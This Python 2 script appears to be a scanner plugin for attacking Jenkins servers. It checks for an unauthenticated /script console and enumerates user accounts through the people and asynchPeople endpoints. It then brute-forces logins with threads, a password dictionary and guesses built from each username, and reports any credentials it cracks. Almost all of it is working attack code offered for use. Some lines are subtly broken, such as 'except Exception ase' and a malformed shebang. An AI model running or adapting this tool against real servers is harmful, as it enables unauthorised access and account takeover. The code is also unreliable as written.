#!/usr/bin/evn/python
#-*- coding:utf-8 -*-
__author__ = 'BlackYe.'
__author__ = 'UNC1E.'

import optparse
import urlparse, urllib, urllib2
import socket
from bs4 import BeautifulSoup, SoupStrainer
import re
import requests
import cookielib
import json
import time,sys
import threading
import Queue
import ssl
ssl._create_default_https_context = ssl._create_unverified_context


PEOPLE_PERFIX = 'people/'
ASYNCH_PEOPEL_PERFIX = 'asynchPeople/'
VERSION_TAG = 'http://jenkins-ci.org'

HTTP_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11",
                "Accept" : "*/*",
                "Cookie": ' bdshare_firstime=1418272043781; mr_97113_1TJ_key=3_1418398208619;'}


USER_LIST = Queue.Queue(0)
BRUST_USER_QUEUE = Queue.Queue(0)
SUC_USER_QUEUE = Queue.Queue(0)



class RedirctHandler(urllib2.HTTPRedirectHandler):
    def http_error_301(self, req, fp, code, msg, headers):
        pass

    def http_error_302(self, req, fp, code, msg, headers):
        pass

class BrustThread(threading.Thread):

    def __init__(self, brust_url, timeout = 8):
        threading.Thread.__init__(self)
        self.brust_url = brust_url
        self.timeout = timeout
        self.try_timeout_cnt = 3
        

    def run(self):
        while BRUST_USER_QUEUE.qsize() > 0:
            user_pwd_info = BRUST_USER_QUEUE.get()
            if user_pwd_info['count'] < self.try_timeout_cnt:
                self.brust(user_pwd_info['user'], user_pwd_info['password'], user_pwd_info['count'])


    def brust(self, user, pwd, count):
        global SUC_USER_QUEUE
        opener = urllib2.build_opener(RedirctHandler)
        urllib2.install_opener(opener)

        try:
            request = urllib2.Request(self.brust_url)
            json_data = '{"j_username":"%s", "j_password":"%s", "remember_me":false}' % (user, pwd)
            data = {"j_username":"%s" % user, "j_password":"%s" % pwd, "json":json_data, "Submit":"登录"}
            postdata = urllib.urlencode(data)
            resp = urllib2.urlopen(request, postdata, timeout = self.timeout)

        except urllib2.HTTPError,e:
            if e.code == 404:
                #color_output(u'[-]....brust url error:%d' % e.code)
                return False
            elif e.code == 301 or e.code == 302:
                    result = re.findall(u'(.*)loginError', e.headers['Location'])
                    if len(result) != 0:
                        pass#color_output(u'[-]....尝试登陆组合 %s:%s, 失败!' % (user, pwd), False)
                    else:
                        SUC_USER_QUEUE.put_nowait({'user':user, 'pwd':pwd})
                        #color_output(u'[-]....尝试登陆组合 %s:%s, 爆破成功!!!' % (user, pwd))
                #print e.headers
            else:
                pass
                #color_output(u'[-]....尝试登陆组合 %s:%s, 失败!' % (user, pwd), False)
        except socket.timeout:
            #color_output(u'[-]....尝试登陆组合 %s:%s, 返回码:timeout' % (user, pwd), False)
            #push to task queue
            cnt = count + 1
            BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":cnt})
        except Exception ase:
            pass
            #color_output(u'[-]....尝试登陆组合 %s:%s, 返回码:%s' % (user, pwd, str(e)), False)



class Jenkins(object):

    def __init__(self, url, thread_num = 10, pwd_dic = "comm_dic.txt"):
        self.url = url if "//" in url else "http://" +url
        self.user_list = []  #user list
        self.check_version = "1.5"
        self.user_link = "asynchPeople"
        self.timeout = 4
        self.thread_num = thread_num
        self.brust_url = urlparse.urljoin(self.url if self.url[-1] == '/' else self.url+'/', 'j_acegi_security_check')
        self.pwd_list = []
        self.pwd_suffix = ['', '123','1234','12345','000']
        self.b_done = True 
        self.anonymous_access = False 
        self.suc_user_dic = {} # succeed users

        pwd_list = []
        with open(pwd_dic) as file:
            for line in file.readlines():
                pwd_list.append(line.strip(' \r\n'))

        self.pwd_list.extend(pwd_list)

    def __bAnonymous_access(self):
        target_url = urlparse.urljoin(self.url if self.url[-1] == '/' else self.url+'/', 'script')
        try:
            resp = urllib2.urlopen(target_url, timeout= self.timeout)
            #color_output('[+]....%s anonymous access vul!' % target_url)
            self.anonymous_access = True 
            return (True, 1)
            
        except :
            return (False, -1)

    def __get_version(self):
        '''
        get jenkins version
        :return:
        '''
        try:
            html = urllib2.urlopen(self.url + '/login?from=%2F').read()
            links = SoupStrainer('a' ,href = re.compile(VERSION_TAG))
            version_text = BeautifulSoup(html, "html.parser", parse_only= links)
            if version_text.text != "":
                #color_output("[+]....jenkins version is %s" % version_text.text)
                version_re = re.findall(u"ver.\s(.*)" ,version_text.text)
                if len(version_re) != 0:
                    if version_re[0][0:4] >= self.check_version:
                        self.user_link = ASYNCH_PEOPEL_PERFIX
                    else:
                        self.user_link = PEOPLE_PERFIX
            else:
                #color_output("[-]....can't get jenkins version!")
                pass
        except urllib2.URLError,e:
            #color_output("[-]....can't get jenkins version!")
            self.b_done = False
        except Exception ase:
            #color_output("[-]....get version error:%s" % str(e))
            self.b_done = False


    def get_all_user_by_people(self):
        user_link = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', self.user_link)
        try:
            html = requests.get(user_link, timeout = self.timeout, headers = HTTP_HEADERS).text
            soup = BeautifulSoup(html, "html.parser")
            table_tag = soup.findAll('table', attrs={'id':'people'})
            for user_href_tag in table_tag[0].findAll('a', attrs={"class":'model-link'}):
                href = user_href_tag.get('href')
                if href != u'/':
                    self.user_list.append(href.replace('/user/', '').strip('/'))

        except requests.exceptions.ConnectTimeout:
            self.b_done = False
            #color_output("[-]....%s timeout!" % user_link)
        except Exception:
            self.b_done = False
            #color_output("[-]....get_all_user_by_people error!")



    def get_all_user_by_async(self):
        user_link = urlparse.urljoin(self.url if self.url[len(self.url)-1] == '/' else self.url+'/', self.user_link)
        cookiejar = cookielib.CookieJar()
        #httpHandler = urllib2.HTTPHandler(debuglevel=1)
        #opener = urllib2.build_opener(httpHandler, urllib2.HTTPCookieProcessor(cookiejar))
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))

        opener.addheaders = [('User-Agent', HTTP_HEADERS['User-Agent'])]
        urllib2.install_opener(opener)

        try:
            html = urllib2.urlopen(user_link, timeout = self.timeout).read()
            result = re.findall(u'makeStaplerProxy\(\'(.*);</script>', html)
            if len(result) != 0:
                re_list = result[0].split(',')
                proxy_num = re_list[0][re_list[0].rfind('/')+1:-1]
                crumb = re_list[1].strip('\'')

                if len(re_list) == 4 and re_list[2].find('start') == -1:
                    self.user_list.extend(self.__get_peopel_waiting_done(urllib2, user_link ,crumb, proxy_num))
                else:
                    start_url = '%s/$stapler/bound/%s/start' % (self.url, proxy_num)
                    req = urllib2.Request(start_url, data = '[]')
                    req.add_header("Content-type", 'application/x-stapler-method-invocation;charset=UTF-8')
                    req.add_header("X-Prototype-Version", "1.7")
                    req.add_header("Origin", self.url)
                    req.add_header("Crumb", crumb)
                    req.add_header("Accept", 'text/javascript, text/html, application/xml, text/xml, */*')
                    req.add_header("X-Requested-With", "XMLHttpRequest")
                    req.add_header("Referer", user_link)
                    resp = urllib2.urlopen(req, timeout = self.timeout)

                    if resp.getcode() == 200:
                        self.user_list.extend(self.__get_peopel_waiting_done(urllib2, user_link, crumb, proxy_num))

        except :
            self.b_done = False


    def __get_peopel_waiting_done(self, URLLIB2, referer, crumb, proxy_num):
        
        user_list = []
        while self.b_done:
            try:
                news_url = '%s/$stapler/bound/%s/news' % (self.url, proxy_num)
                req = URLLIB2.Request(news_url, data = '[]')
                req.add_header("Content-type", 'application/x-stapler-method-invocation;charset=UTF-8')
                req.add_header("X-Prototype-Version", "1.7")
                req.add_header("Content-Length",'2')
                req.add_header("Accept-Encoding", "identity")
                req.add_header("Origin", self.url)
                req.add_header("Crumb", crumb)
                req.add_header("X-Requested-With", "XMLHttpRequest")
                req.add_header("Referer", referer)
                resp = URLLIB2.urlopen(req, timeout = self.timeout)

                if resp.getcode() == 200:
                    try:
                        content = resp.read()
                        ret_json = json.loads(content, encoding="utf-8")
                        for item in ret_json['data']:
                            if item['id'] != None:
                                user_list.append(item['id'])

                        if ret_json['status'] == 'done': #wait recv end
                            self.b_done = False

                        #time.sleep(0.5)

                    except Exception ase:
                        #print str(e)
                        self.b_done = False
                else:
                    self.b_done = False

            except urllib2.HTTPError,e:
                self.b_done = False
            except socket.timeout:
                self.b_done = False
            except Exception:
                self.b_done = False

        return list(set(user_list))


    def work(self):
        #print '* Detect Jenkins anonymous access'
        info, status = self.__bAnonymous_access()

        if status == 1 and not info:
            #print '* Get Jenkins Version'
            self.__get_version() #获取版本信息


            if self.user_link == PEOPLE_PERFIX:
                self.get_all_user_by_people()
            elif self.user_link == ASYNCH_PEOPEL_PERFIX:
                self.get_all_user_by_async()

            if len(self.user_list) != 0:

                for user in self.user_list:
                    for pwd in self.pwd_list:
                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":0})
                    #动态生成密码
                    for suffix_pwd in self.pwd_suffix:
                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":user + suffix_pwd, "count":0})


                threads = []
                for i in range(self.thread_num):
                    brustthread = BrustThread(self.brust_url)
                    threads.append(brustthread)

                for brustthread in threads:
                    brustthread.start()

                for brustthread in threads:
                    brustthread.join()

                if  SUC_USER_QUEUE.qsize() > 0:
                   
                    while SUC_USER_QUEUE.qsize() > 0:
                        self.suc_user_dic = SUC_USER_QUEUE.get_nowait()
                        ##color_output('User:%s, Password:%s' % (suc_user_dic['user'], suc_user_dic['pwd']))

            
    def test(self):
        self.__bAnonymous_access()
        

def poc(url):
    '''jenkins弱密码poc，爆破成功才会有密码显示
    存在未授权时:   [+]192.*.*.1
    不存在未授权时: [-]192.*.*.1[admin-admin]
    
    '''
    jenkins_work = Jenkins(url = url, thread_num = 5, pwd_dic = "script/comm_dic.txt")
    jenkins_work.work()
    
    symbol_prefix = "[+]" if jenkins_work.anonymous_access else "[-]"
    if jenkins_work.anonymous_access:
        return symbol_prefix + jenkins_work.url 
    
    if jenkins_work.suc_user_dic and jenkins_work.b_done :
        return symbol_prefix + jenkins_work.url + "[%s-%s]" % (jenkins_work.suc_user_dic['user'], jenkins_work.suc_user_dic['pwd'])
    else:
        return False
    